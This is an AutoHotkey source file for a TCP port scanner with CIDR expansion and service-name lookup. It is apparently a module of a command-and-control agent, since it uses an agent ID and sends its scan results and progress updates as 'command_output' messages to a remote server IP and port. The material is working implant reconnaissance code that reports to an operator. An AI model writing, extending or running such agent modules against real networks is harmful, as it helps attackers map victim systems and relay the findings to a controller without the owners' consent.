; ============================================================================
; PORT SCANNER MODULE
; ============================================================================
; TCP port scanner with CIDR support and service detection
; ============================================================================

PortScanner(targetHosts, portRanges := "20-25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,9929,31337") {
    startTime := A_TickCount
    results := ""

    ; Parse port ranges first
    ports := ParsePortRange(portRanges)

    ; Handle input formats and generate IP list
    hosts := ParseIPRange(targetHosts)

    for host in hosts {
        results .= "Starting scan of " host " at " FormatTime(, "yyyy-MM-dd HH:mm") "`n`n"

        openPorts := []
        closedPorts := []
        filteredPorts := []

        totalPorts := ports.Length
        scannedPorts := 0

        ; Scan all ports
        for port in ports {
            result := TestPort(host, port)
            scannedPorts++

            switch result {
                case "open":
                    openPorts.Push(port)
                case "closed":
                    closedPorts.Push(port)
                case "filtered":
                    filteredPorts.Push(port)
            }
            UpdateProgress(scannedPorts, totalPorts, host)
        }

        ; Calculate stats
        closedCount := closedPorts.Length
        filteredCount := filteredPorts.Length
        openCount := openPorts.Length

        ; Generate report for this host
        if (closedCount = totalPorts) {
            results .= "All " totalPorts " scanned ports are closed`n"
        } else {
            if (closedCount > 0) {
                results .= "Not shown: " closedCount " closed tcp ports`n"
            }
            if (filteredCount > 0) {
                results .= filteredCount " filtered port" (filteredCount = 1 ? "" : "s") "`n"
            }

            results .= "`nPORT      STATE    SERVICE`n"

            ; Add open ports
            for port in openPorts {
                serviceName := GetServiceName(port)
                results .= Format("{:-8}/tcp {:-8} {}`n", port, "open", serviceName)
            }

            ; Add filtered ports
            for port in filteredPorts {
                serviceName := GetServiceName(port)
                results .= Format("{:-8}/tcp {:-8} {}`n", port, "filtered", serviceName)
            }
        }

        results .= "`n"
    }

    ; Add timing information
    elapsedTime := (A_TickCount - startTime) / 1000
    results .= "Scan completed in " Format("{:.2f}", elapsedTime) " seconds`n"

    message := Format("command_output|{}|{}", this.agentID, results)
    response := this.SendMsg(this.serverIP, this.serverPort, message)

    return results

    ; Helper functions
    ParseIPRange(input) {
        if IsObject(input)
            return input

        ; Check if input is CIDR notation
        if InStr(input, "/") {
            parts := StrSplit(input, "/")
            if parts.Length != 2
                return [input]

            baseIP := parts[1]
            cidrBits := Integer(parts[2])

            ; Validate CIDR bits
            if (cidrBits < 0 || cidrBits > 32)
                return [input]

            ; Convert IP to integer
            ipParts := StrSplit(baseIP, ".")
            if ipParts.Length != 4
                return [input]

            ipInt := (ipParts[1] << 24) + (ipParts[2] << 16) + (ipParts[3] << 8) + ipParts[4]

            ; Calculate network and broadcast addresses
            mask := (0xFFFFFFFF << (32 - cidrBits)) & 0xFFFFFFFF
            network := ipInt & mask
            broadcast := network + (1 << (32 - cidrBits)) - 1

            ; Generate IP list
            ipList := []
            Loop (broadcast - network + 1) {
                currentIP := network + A_Index - 1
                ipList.Push(Format("{}.{}.{}.{}",
                    (currentIP >> 24) & 0xFF,
                    (currentIP >> 16) & 0xFF,
                    (currentIP >> 8) & 0xFF,
                    currentIP & 0xFF))
            }

            return ipList
        }

        ; If not CIDR, return single IP
        return [input]
    }

    GetServiceName(port) {
        static services := Map(
            20, "ftp-data",
            21, "ftp",
            22, "ssh",
            23, "telnet",
            25, "smtp",
            53, "domain",
            80, "http",
            110, "pop3",
            111, "rpcbind",
            135, "msrpc",
            139, "netbios-ssn",
            143, "imap",
            443, "https",
            445, "microsoft-ds",
            993, "imaps",
            995, "pop3s",
            1723, "pptp",
            3306, "mysql",
            3389, "ms-wbt-server",
            5900, "vnc",
            8080, "http-proxy",
            9929, "nping-echo",
            31337, "Elite"
        )
        return services.Has(port) ? services[port] : "unknown"
    }

    ParsePortRange(portRange) {
        ports := []
        ranges := StrSplit(portRange, ",")

        for range in ranges {
            if InStr(range, "-") {
                parts := StrSplit(range, "-")
                if (parts.Length != 2)
                    continue

                start := Integer(parts[1])
                end := Integer(parts[2])

                if (start > end || start < 1 || end > 65535)
                    continue

                Loop (end - start + 1)
                    ports.Push(start + A_Index - 1)
            } else {
                port := Integer(range)
                if (port >= 1 && port <= 65535)
                    ports.Push(port)
            }
        }

        return ports
    }

    UpdateProgress(current, total, host) {
        percentage := Round((current / total) * 100)
        this.Log("`rScanning " host " " percentage "% complete")
        data := ("`rScanning " host " " percentage "% complete")
        message := Format("command_output|{}|{}", this.agentID, data)
        response := this.SendMsg(this.serverIP, this.serverPort, message)
    }

    TestPort(ip, port) {
        ; Constants
        AF_INET := 2
        SOCK_STREAM := 1
        IPPROTO_TCP := 6
        SOCKET_ERROR := -1
        WSAECONNREFUSED := 10061
        WSAETIMEDOUT := 10060

        ; Initialize WSA
        wsaData := Buffer(408)
        if (DllCall("Ws2_32\WSAStartup", "UShort", 0x0202, "Ptr", wsaData)) {
            Log("WSAStartup failed")
            return "error"
        }

        ; Create socket
        sock := DllCall("Ws2_32\socket", "Int", AF_INET, "Int", SOCK_STREAM, "Int", IPPROTO_TCP)
        if (sock = -1) {
            DllCall("Ws2_32\WSACleanup")
            Log("Socket creation failed")
            return "error"
        }

        ; Set timeout (3 seconds)
        timeout := Buffer(8, 0)
        NumPut("Int", 3000, timeout, 0)
        DllCall("Ws2_32\setsockopt", "Ptr", sock, "Int", 0xFFFF, "Int", 0x1005, "Ptr", timeout, "Int", 4)
        DllCall("Ws2_32\setsockopt", "Ptr", sock, "Int", 0xFFFF, "Int", 0x1006, "Ptr", timeout, "Int", 4)

        ; Create sockaddr structure
        sockaddr := Buffer(16, 0)
        NumPut("UShort", AF_INET, sockaddr, 0)
        NumPut("UShort", DllCall("Ws2_32\htons", "UShort", port), sockaddr, 2)
        NumPut("UInt", DllCall("Ws2_32\inet_addr", "AStr", ip), sockaddr, 4)

        ; Try to connect
        result := DllCall("Ws2_32\connect", "Ptr", sock, "Ptr", sockaddr, "Int", 16)

        ; Get error code if connection failed
        error := 0
        if (result = SOCKET_ERROR) {
            error := DllCall("Ws2_32\WSAGetLastError")
        }

        ; Clean up
        DllCall("Ws2_32\closesocket", "Ptr", sock)
        DllCall("Ws2_32\WSACleanup")

        ; Return appropriate status
        if (result = 0)
            return "open"
        else if (error = WSAECONNREFUSED)
            return "closed"
        else if (error = WSAETIMEDOUT)
            return "filtered"
        else
            return "filtered"
    }
}
